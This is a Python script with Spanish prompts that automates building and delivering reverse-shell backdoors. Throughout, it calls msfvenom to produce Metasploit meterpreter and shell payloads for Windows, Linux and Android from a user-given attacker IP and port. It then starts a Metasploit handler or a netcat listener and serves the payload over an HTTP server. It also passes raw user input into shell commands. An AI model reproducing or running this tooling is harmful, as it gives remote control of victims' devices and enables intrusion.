import os

from sys import stdout

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)

def blue():
    BLUE = "\033[1;34m"
    stdout.write(BLUE)

def yellow():
    YELLOW = "\033[1;33m"
    stdout.write(YELLOW)

def purple():
    PURPLE = "\033[1;35m"
    stdout.write(PURPLE)

def white():
    WHITE = "\033[1;37m"
    stdout.write(WHITE)

# Lista de Payloads

windowsPayloads = """

Payloads:
        |---- Metasploit ----
        |
        | 1 -> windows/meterpreter/reverse_tcp
        |
        | 2 -> windows/meterpreter/reverse_http
        |
        | 3 -> python/meterpreter/reverse_tcp
        |
        |---- NetCat ----
        |
        | 1 -> windows/shell/reverse_tcp
        |
        | 2 -> windows/shell/reverse_udp
        |
        | 3 -> python/shell_reverse_tcp

	"""

linuxPayloads = """

Payloads:
        |---- Metasploit ----
        |
        | 1 -> linux/x86/meterpreter/reverse_tcp
        |
        | 2 -> linux/x86/meterpreter_reverse_http
        |
        | 3 -> linux/x64/meterpreter/reverse_tcp
        |
        | 4 -> linux/x64/meterpreter_reverse_http
        |
        | 5 -> python/meterpreter/reverse_tcp
        |
        |---- NetCat ----
        |
        | 1 -> python/shell_reverse_tcp
"""

androidPayloads = """

Payloads:
        |---- Metasploit ----
        |
        | 1 -> android/meterpreter_reverse_tcp
        |
        | 2 -> android/meterpreter_reverse_http
        |
        |---- NetCat ----
        |
        | 1 -> android/shell/reverse_tcp
        |
        | 2 -> android/shell/reverse_http



"""

# HTTP Server

def http():

    os.system("gnome-terminal -- python3 -m http.server "+httpPort)

# Listener

def msfListener():

    print("")
    os.chdir("..")
    os.system("echo 'use exploit/multi/handler' > global.rb")
    os.system("echo 'set PAYLOAD "+payload+"' >> global.rb")
    os.system("echo 'set LHOST "+ip+"' >> global.rb")
    os.system("echo 'set LPORT "+port+"' >> global.rb")
    os.system("echo 'exploit' >> global.rb")
    os.system("gnome-terminal -- msfconsole -r global.rb")

    http()

def ncListener():

    print("")
    os.chdir("..")
    os.system("gnome-terminal -- nc -nlvp "+port)

    http()

# Windows Payloads

def wmrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+file+".exe 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".exe")

    msfListener()

def wmrhttp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" -f exe -o "+file+".exe 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".exe")

    msfListener()

def pmrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p python/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw -o "+file+".py 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".py")

    msfListener()

def wsrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p windows/shell/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+file+".exe 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".exe")

    ncListener()

def wsrudp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p windows/shell/reverse_udp LHOST="+ip+" LPORT="+port+" -f exe -o "+file+".exe 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".exe")

    ncListener()

def psrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p python/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw -o "+file+".py 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".py")

    ncListener()

# Linux Payloads

def l86mrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf -o "+file+".elf 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".elf")

    msfListener()

def l86mrhttp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p linux/x86/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" -f elf -o "+file+".elf 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".elf")

    msfListener()

def l64mrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf -o "+file+".elf 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".elf")

    msfListener()

def l64mrhttp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p linux/x64/meterpreter_reverse_http LHOST="+ip+" LPORT="+port+" -f elf -o "+file+".elf 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".elf")

    msfListener()

# Android

def amrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p android/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -o "+file+".apk 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".apk")

    msfListener()

def amrhttp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p android/meterpreter_reverse_http LHOST="+ip+" LPORT="+port+" -o "+file+".apk 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".apk")

    msfListener()

def asrtcp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p android/shell/reverse_tcp LHOST="+ip+" LPORT="+port+" -o "+file+".apk 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".apk")

    ncListener()

def asrhttp():

    os.system("rm -r output/ 2>/dev/null")
    os.mkdir("output/")
    os.chdir("output/")

    os.system("msfvenom -p android/shell/reverse_http LHOST="+ip+" LPORT="+port+" -o "+file+".apk 2>/dev/null")

    red()
    print("\nGuardado en output/"+file+".apk")

    ncListener()

# Menú

red()
sistema = input("\nSistema Operativo: windows/linux/android --> ")
blue()

if sistema == "windows":
        print(windowsPayloads)

if sistema == "linux":
        print(linuxPayloads)

if sistema == "android":
        print(androidPayloads)

green()

# Variables globales

payload = input("\n[*] Payload --> ")

ip = input("\n[*] Ip --> ")

port = input("\n[*] Puerto --> ")

file = input("\n[*] Nombre del archivo --> ")

httpPort = input("\n[*] Puerto HTTP --> ")

# Windows

if payload == "windows/meterpreter/reverse_tcp":
        wmrtcp()

if payload == "windows/meterpreter/reverse_http":
        wmrhttp()

if payload == "python/meterpreter/reverse_tcp":
        pmrtcp()

if payload == "windows/shell/reverse_tcp":
        wsrtcp()

if payload == "windows/shell/reverse_udp":
        wsrudp()

if payload == "python/shell_reverse_tcp":
        psrtcp()

# Linux

if payload == "linux/x86/meterpreter/reverse_tcp":
        l86mrtcp()

if payload == "linux/x86/meterpreter_reverse_http":
        l86mrhttp()

if payload == "linux/x64/meterpreter/reverse_tcp":
        l64mrtcp()

if payload == "linux/x64/meterpreter_reverse_http":
        l64mrhttp()

# Android

if payload == "android/meterpreter_reverse_tcp":
        amrtcp()

if payload == "android/meterpreter_reverse_http":
        amrhttp()

if payload == "android/shell/reverse_tcp":
        asrtcp()

if payload == "android/shell/reverse_http":
        asrhttp()

# if __name__ == '__main__':
# 	main()
